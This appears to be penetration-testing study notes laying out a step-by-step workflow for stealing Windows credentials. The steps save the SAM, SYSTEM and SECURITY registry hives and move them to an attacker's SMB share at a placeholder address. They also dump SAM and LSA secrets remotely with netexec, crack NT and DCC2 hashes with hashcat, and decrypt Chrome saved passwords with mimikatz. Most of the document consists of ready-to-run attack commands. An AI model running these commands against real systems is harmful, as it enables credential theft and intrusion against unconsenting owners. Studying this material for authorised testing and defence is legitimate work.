### Attacking SAM, SYSTEM, and SECURITY Hives

Dumping registry hives allows for **offline hash cracking**, which avoids the need to maintain an active session on the target. This technique is used after gaining **local administrative access**.

#### Registry Hive Reference

|Registry Hive|Description|
|:--|:--|
|**HKLM\SAM**|Contains password hashes for **local user accounts**.|
|**HKLM\SYSTEM**|Stores the **system boot key** required to decrypt the SAM database.|
|**HKLM\SECURITY**|Contains **LSA secrets**, cached domain credentials (**DCC2**), and **DPAPI** keys.|

---

#### Operational Workflow: Manual Offline Extraction

This method is used to manually exfiltrate hive files when you have interactive shell access.

1. **Save Registry Hives**: Use `reg.exe` to create copies of the hives on the local filesystem.
    
    ```
    reg.exe save hklm\sam C:\sam.save
    reg.exe save hklm\system C:\system.save
    reg.exe save hklm\security C:\security.save
    ```
    
2. **Prepare Attack Host**: Start an SMB server to receive the files. Use the `-smb2support` flag to ensure compatibility with modern Windows systems where SMBv1 is disabled.
    
    ```
    sudo python3 smbserver.py -smb2support <SHARE_NAME> <LOCAL_DIRECTORY_PATH>
    ```
    
3. **Exfiltrate Hives**: Move the saved files from the target to the attack host share.
    
    ```
    move sam.save \\<ATTACK_IP>\<SHARE_NAME>
    move system.save \\<ATTACK_IP>\<SHARE_NAME>
    move security.save \\<ATTACK_IP>\<SHARE_NAME>
    ```
    
4. **Extract Hashes Offline**: Use `secretsdump.py` to process the hives. The tool automatically retrieves the boot key from the SYSTEM hive to decrypt the SAM and SECURITY data.
    
    ```
    python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    ```
    

---

#### Remote Extraction Workflow

If you possess **local administrator credentials**, you can dump secrets remotely over the network without manual file movement.

|Goal|Command|
|:--|:--|
|**Dump SAM Hashes**|`netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam`|
|**Dump LSA Secrets**|`netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --lsa`|

- **Attack Implication**: Dumping **LSA secrets** can reveal credentials for running services, scheduled tasks, and applications.

---

#### Password Cracking with Hashcat

Once hashes are extracted, they are placed in a file for offline cracking.

|Hash Type|Hashcat Mode|Characteristics|
|:--|:--|:--|
|**NT (NTLM)**|`1000`|Standard for modern Windows; fast to crack.|
|**DCC2**|`2100`|Cached domain credentials; uses PBKDF2; **~800x slower** to crack than NT.|

**Cracking Commands:**

```
# Crack NT hashes
sudo hashcat -m 1000 <HASH_FILE> <WORDLIST_PATH>

# Crack DCC2 hashes
hashcat -m 2100 <DCC2_HASH_OR_FILE> <WORDLIST_PATH>
```

- **Note**: DCC2 hashes **cannot** be used for Pass-the-Hash attacks.

---

#### Data Protection API (DPAPI)

DPAPI is used by Windows and third-party apps to encrypt data on a per-user basis.

**Common DPAPI Applications:**

- **Browsers**: Internet Explorer and Google Chrome (saved passwords).
- **Communications**: Outlook (email passwords).
- **Connectivity**: Remote Desktop Connection and Credential Manager (VPNs, Wireless, shares).

**Manual Decryption Example (Chrome):** Use `mimikatz` to decrypt saved browser credentials once the DPAPI keys are obtained from the SECURITY hive.

```
mimikatz.exe
dpapi::chrome /in:"C:\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```